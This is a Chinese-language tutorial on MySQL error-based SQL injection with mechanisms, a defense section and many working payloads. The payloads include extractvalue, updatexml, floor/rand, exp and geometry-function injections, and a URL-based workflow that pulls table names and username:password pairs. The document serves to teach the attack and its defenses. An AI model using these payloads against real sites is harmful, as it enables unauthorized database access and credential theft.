# SQL 报错注入

## 一、概述

### 1.1 什么是报错注入

报错注入（Error-Based SQL Injection）是一种利用数据库错误信息来获取敏感数据的SQL注入技术。当应用程序没有正确处理数据库错误时，攻击者可以通过构造特殊的SQL语句，使数据库返回错误信息，这些错误信息中可能包含数据库结构、字段名甚至数据内容等敏感信息。

### 1.2 报错注入的原理

SQL报错注入的核心原理是利用数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中返回。攻击者利用数据库在处理异常情况时返回的错误消息，来推断或直接获取数据库中的敏感数据。

### 1.3 报错注入的前提条件

1. **页面有错误信息回显**：网页能够显示数据库的详细错误信息
2. **开发程序使用了错误输出函数**：如 `print_r()`、`mysql_error()`、`mysqli_connect_error()` 等
3. **能够构造合法的SQL语句结构**：SQL语句本身结构正确，只是在执行过程中触发错误
4. **数据库版本支持相应的报错函数**：不同的报错函数有不同的版本要求

## 二、常用报错注入函数

### 2.1 extractvalue() 函数

#### 2.1.1 函数介绍

`extractvalue()` 函数是MySQL 5.1.5版本中添加的用于对XML文档进行查询的函数。

**语法格式：**
```sql
EXTRACTVALUE(XML_document, XPath_string)
```

**参数说明：**
- **XML_document**：String格式，为XML文档对象的名称
- **XPath_string**：XPath格式的字符串，用于指定查询路径

#### 2.1.2 报错原理

当XPath表达式格式不正确时，MySQL会返回XPath语法错误，并在错误信息中显示无法识别的内容。通过在XPath参数中使用 `~`、`#`、`$` 等非XPath语法字符，可以触发报错。

#### 2.1.3 Payload 示例

```sql
-- 获取当前数据库名
AND extractvalue(1, concat(0x7e, (SELECT database()), 0x7e))

-- 获取当前用户
AND extractvalue(1, concat(0x7e, (SELECT user()), 0x7e))

-- 获取数据库版本
AND extractvalue(1, concat(0x7e, (SELECT version()), 0x7e))

-- 获取表名
AND extractvalue(1, concat(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e))

-- 获取列名
AND extractvalue(1, concat(0x7e, (SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1), 0x7e))
```

#### 2.1.4 注意事项

- **输出长度限制**：最多只能显示32个字符
- 如果需要获取超过32个字符的数据，需要使用 `substring()` 函数截取

### 2.2 updatexml() 函数

#### 2.2.1 函数介绍

`updatexml()` 函数同样是MySQL 5.1.5版本添加的用于更新XML文档的函数。

**语法格式：**
```sql
UPDATEXML(XML_document, XPath_string, new_value)
```

**参数说明：**
- **XML_document**：String格式，为XML文档对象的名称
- **XPath_string**：XPath格式的字符串路径
- **new_value**：String格式，替换查找到的符合条件的数据

#### 2.2.2 报错原理

与 `extractvalue()` 类似，当XPath表达式格式错误时会触发报错，错误信息中会包含无法识别的内容。

#### 2.2.3 Payload 示例

```sql
-- 获取当前数据库名
AND updatexml(1, concat(0x7e, (SELECT database()), 0x7e), 1)

-- 获取所有表名
AND updatexml(1, concat(0x7e, (SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()), 0x7e), 1)

-- 获取特定表的列名
AND updatexml(1, concat(0x7e, (SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users'), 0x7e), 1)

-- 获取数据
AND updatexml(1, concat(0x7e, (SELECT concat(username, ':', password) FROM users LIMIT 0,1), 0x7e), 1)
```

#### 2.2.4 注意事项

- **输出长度限制**：同样最多只能显示32个字符
- 不能直接使用 `group_concat()` 获取所有信息，通常需要使用 `limit` 逐条获取

### 2.3 floor() 报错注入

#### 2.3.1 原理介绍

floor报错注入是利用 `count()`、`floor()`、`rand()` 和 `group by` 四个条件组合形成主键重复的错误。

**核心机制：**
1. `floor()` 函数：向下取整
2. `rand()` 函数：生成0~1之间的随机数
3. `rand(0)` 函数：使用固定种子生成伪随机数序列（011011...）
4. `floor(rand(0)*2)` 产生固定的0和1序列
5. `group by` 在执行时会创建临时表，将 `group by` 的对象作为主键

**报错原因：**
当 `group by` 在向临时表插入数据时，由于 `rand()` 函数会被计算多次（查询时一次，插入时又一次），导致主键重复，从而触发 "Duplicate entry" 错误。

#### 2.3.2 Payload 示例

```sql
-- 基本格式
AND (SELECT 1 FROM (SELECT count(*), concat((SQL语句), floor(rand(0)*2)) x FROM information_schema.tables GROUP BY x) a)

-- 获取数据库版本
AND (SELECT 1 FROM (SELECT count(*), concat(version(), floor(rand(0)*2)) x FROM information_schema.tables GROUP BY x) a)

-- 获取当前数据库
AND (SELECT 1 FROM (SELECT count(*), concat(database(), floor(rand(0)*2)) x FROM information_schema.tables GROUP BY x) a)

-- 获取表名
AND (SELECT 1 FROM (SELECT count(*), concat((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), floor(rand(0)*2)) x FROM information_schema.tables GROUP BY x) a)
```

#### 2.3.3 注意事项

- **记录数量要求**：查询的表中必须至少有3条记录才能触发报错
- **版本限制**：在MySQL 8.0及以后版本中已失效
- **随机性**：使用 `rand(0)` 可以确保报错的稳定性，使用 `rand()` 则具有随机性

### 2.4 exp() 函数报错注入

#### 2.4.1 函数介绍

`exp()` 是MySQL中的数学函数，用于计算e的x次方。当传入的参数过大时，会产生DOUBLE溢出错误。

#### 2.4.2 报错原理

- exp函数在参数大于709时会溢出
- 利用按位取反运算 `~0` 得到最大的无符号BIGINT值（18446744073709551615）
- 当SQL查询成功返回时，返回值为0，对其进行逻辑非运算后得到1，再取反得到极大值

#### 2.4.3 Payload 示例

```sql
-- 获取用户信息
AND exp(~(SELECT * FROM (SELECT user()) a))

-- 获取数据库版本
AND exp(~(SELECT * FROM (SELECT version()) a))

-- 获取数据库名
AND exp(~(SELECT * FROM (SELECT database()) a))
```

#### 2.4.4 注意事项

- **版本限制**：适用于MySQL 5.5.5 ~ 5.5.53版本
- 在MySQL 5.5.53之后的版本，报错信息中不会返回具体的查询结果

### 2.5 几何函数报错注入

MySQL中的空间数据类型函数在参数格式错误时会产生报错，可用于报错注入。

#### 2.5.1 支持的函数

- `geometrycollection()`
- `multipoint()`
- `polygon()`
- `multipolygon()`
- `linestring()`
- `multilinestring()`

#### 2.5.2 Payload 示例

```sql
-- GeometryCollection
AND GeometryCollection((SELECT * FROM (SELECT * FROM (SELECT user()) a) b))

-- polygon
AND polygon((SELECT * FROM (SELECT * FROM (SELECT database()) a) b))

-- multipoint
AND multipoint((SELECT * FROM (SELECT * FROM (SELECT user()) a) b))

-- multipolygon
AND multipolygon((SELECT * FROM (SELECT * FROM (SELECT database()) a) b))

-- linestring
AND LINESTRING((SELECT * FROM (SELECT * FROM (SELECT user()) a) b))

-- multilinestring
AND multilinestring((SELECT * FROM (SELECT * FROM (SELECT user()) a) b))
```

#### 2.5.3 版本要求

这些函数在MySQL 5.1及以后版本可用，但具体的报错行为可能因版本而异。

### 2.6 其他报错注入函数

#### 2.6.1 name_const()

适用于MySQL 5.0.12及以上版本。

```sql
AND (SELECT * FROM (SELECT name_const(version(), 1), name_const(version(), 1)) a)
```

#### 2.6.2 GTID_SUBSET() (MySQL 5.6+)

```sql
AND GTID_SUBSET(CONCAT('~', (SELECT version()), '~'), 1337)
```

#### 2.6.3 JSON_KEYS() (MySQL 5.7+)

```sql
AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('~', (SELECT version()), '~')) USING utf8)))
```

## 三、报错注入实战流程

### 3.1 判断注入点

```sql
-- 添加单引号测试
?id=1'

-- 检查是否有错误回显
-- 如果看到类似 "You have an error in your SQL syntax" 的信息，说明可能存在注入点
```

### 3.2 确认报错注入可行性

```sql
-- 测试extractvalue
?id=1' AND extractvalue(1, concat(0x7e, version(), 0x7e))--+

-- 测试updatexml
?id=1' AND updatexml(1, concat(0x7e, version(), 0x7e), 1)--+
```

### 3.3 信息收集

#### 获取数据库版本和当前用户

```sql
?id=1' AND extractvalue(1, concat(0x7e, version(), 0x7e))--+
?id=1' AND extractvalue(1, concat(0x7e, user(), 0x7e))--+
?id=1' AND extractvalue(1, concat(0x7e, database(), 0x7e))--+
```

#### 获取所有数据库

```sql
?id=1' AND extractvalue(1, concat(0x7e, (SELECT schema_name FROM information_schema.schemata LIMIT 0,1), 0x7e))--+
```

#### 获取表名

```sql
?id=1' AND extractvalue(1, concat(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e))--+
```

#### 获取列名

```sql
?id=1' AND extractvalue(1, concat(0x7e, (SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1), 0x7e))--+
```

#### 获取数据

```sql
?id=1' AND extractvalue(1, concat(0x7e, (SELECT concat(username, ':', password) FROM users LIMIT 0,1), 0x7e))--+
```

## 四、绕过技巧

### 4.1 处理长度限制

由于extractvalue和updatexml有32字符的长度限制，可以使用substring函数分段获取：

```sql
-- 获取前32个字符
AND extractvalue(1, concat(0x7e, substring((SELECT password FROM users LIMIT 0,1), 1, 32), 0x7e))

-- 获取第33-64个字符
AND extractvalue(1, concat(0x7e, substring((SELECT password FROM users LIMIT 0,1), 33, 32), 0x7e))
```

### 4.2 绕过过滤

```sql
-- 使用十六进制代替字符
concat(0x7e, ...) 代替 concat('~', ...)

-- 使用不同的分隔符
0x7e  -- ~
0x3a  -- :
0x5c  -- \
0x23  -- #
```

### 4.3 无法使用group_concat的情况

使用LIMIT逐条获取数据：

```sql
LIMIT 0,1  -- 第一条
LIMIT 1,1  -- 第二条
LIMIT 2,1  -- 第三条
...
```

## 五、防御措施

### 5.1 关闭错误回显

```php
// PHP中关闭错误显示
error_reporting(0);
ini_set('display_errors', 'Off');
```

### 5.2 使用参数化查询

```php
// PDO预处理语句
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);
```

### 5.3 输入验证和过滤

```php
// 验证输入类型
if (!is_numeric($id)) {
    die("Invalid input");
}

// 使用白名单
if (!preg_match('/^\w{1,20}$/', $username)) {
    die("Invalid username");
}
```

### 5.4 最小权限原则

- 数据库用户只给予必要的权限
- 禁止FILE权限
- 限制对information_schema的访问
